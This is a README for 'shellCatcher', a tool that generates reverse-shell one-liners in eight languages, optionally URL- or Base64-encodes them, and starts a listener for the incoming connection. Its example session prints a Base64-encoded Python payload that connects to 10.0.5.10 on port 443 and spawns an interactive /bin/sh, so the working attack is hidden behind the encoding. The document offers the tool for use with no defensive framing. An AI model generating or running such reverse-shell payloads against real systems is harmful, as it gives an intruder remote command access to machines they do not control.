shellCatcher
============

Small tool that spits out a reverse shell string in different languages, and spins up a listener that waits for its connection


example usage
============

Welcome to shellCatcher!
Please select a language to use from the list below:

[0] Bash
[1] PERL
[2] Python
[3] Netcat
[4] PHP
[5] Ruby
[6] Java
[7] xterm

\> 2

Please insert your IP address and port number
ex: 192.168.0.10:443

\> 10.0.5.10:443

Select an encoding. If you don't want one, select 0:
[0] None
[1] URL
[2] Base64

\> 2

Reverse Shell String:

cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMC41LjEwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=

Spawning the listener on port 443
Waiting for connection...
